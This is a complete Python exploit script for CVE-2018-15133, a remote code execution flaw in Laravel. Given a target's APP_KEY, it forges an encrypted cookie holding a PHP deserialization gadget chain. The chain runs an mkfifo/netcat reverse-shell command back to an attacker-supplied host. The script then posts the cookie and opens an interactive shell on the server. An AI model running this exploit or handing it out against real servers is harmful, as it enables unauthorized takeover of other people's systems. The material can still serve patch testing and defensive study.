# -*- coding:utf-8 -*-
# Laravel Framework 5.5.40/5.6.X < 5.6.30 - token Unserialize Remote Command Execution
# CVE:  2018-15133
# Exploit author: StÃ¥le Pettersen
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import base64
import hmac
import json
import requests
import sys
from pwn import *
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from hashlib import sha256


def main():
    global proxies, url
    
    # args
    argparser = argparse.ArgumentParser(description='Laravel Framework 5.5.40/5.6.X < 5.6.30 - token Unserialize Remote Command Execution',
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")

    main_arg.add_argument('-h', '--help',
                            help='Show this help menu',
                            action='store_true')

    main_arg.add_argument('-u', '--url', type=str,
                            help='Laravel URL to exploit',
                            required=True)

    main_arg.add_argument('--appkey', type=str,
                            help='Laravel APP Key',
                            required=True)

    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive the reverse shell',
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive the reverse shell (default: 4444)',
                            default='4444')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable BurpSuite\'s proxy')

    args = argparser.parse_args()

    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)

    # cons
    url = args.url
    if url.endswith == '/':
        url = url[:-1]

    appkey = args.appkey
    lhost = args.lhost
    lport = args.lport
    burpsuite = args.burpsuite

    # proxies
    proxies = {"http": "http://127.0.0.1:8080"}

    def reverse_shell(l):
        l.interactive()

    def generate_token():

        payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} > /tmp/f".format(lhost, lport)

        l1 = log.progress("Generating the malicious token")

        try:
            serialized_payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";'
            serialized_payload += 'O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";'
            serialized_payload +='a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(payload)) + ':"' + payload + '";}'

            encoded_serialized_payload = base64.b64encode(serialized_payload)

            cipher = AES.new(base64.b64decode(appkey), AES.MODE_CBC)
            value = cipher.encrypt(pad(base64.b64decode(encoded_serialized_payload), AES.block_size))
            payload = base64.b64encode(value)
            iv_base64 = base64.b64encode(cipher.iv)
            hashed_mac = hmac.new(base64.b64decode(appkey), iv_base64 + payload, sha256).hexdigest()
            data = {"iv": iv_base64, "value": payload, "mac": hashed_mac}
            json_data = base64.b64encode(json.dumps(data))

        except Exception as e:
            print(e)
            l1.failure("Failed to generate the malicious token.")
        else:
            l1.success("Malicious token generated with success!")
            return json_data

        
    def exploit(malicious_token):
        global proxies

        cookies = {"X-XSRF-TOKEN": malicious_token}

        l = listen(lport)
        l1 = log.progress("Exploiting the Laravel")

        if burpsuite:
            try:
                r = requests.post(url, cookies=cookies, proxies=proxies, timeout=5)
            except:
                l1.success("Success!")
                log.info("Spawning the interactive shell")
                reverse_shell(l)

        else:
            try:
                r = requests.post(url, cookies=cookies, timeout=5)
            
            except:
                l1.success("Success!")
                log.info("Spawning the interactive shell")
                reverse_shell(l)
                

    # main
    log.info("Laravel Framework 5.5.40/5.6.X < 5.6.30 - token Unserialize Remote Command Execution")
    log.info("Python script exploit author: nullarmor")
    
    exploit(generate_token())


if __name__ == '__main__':
    main()
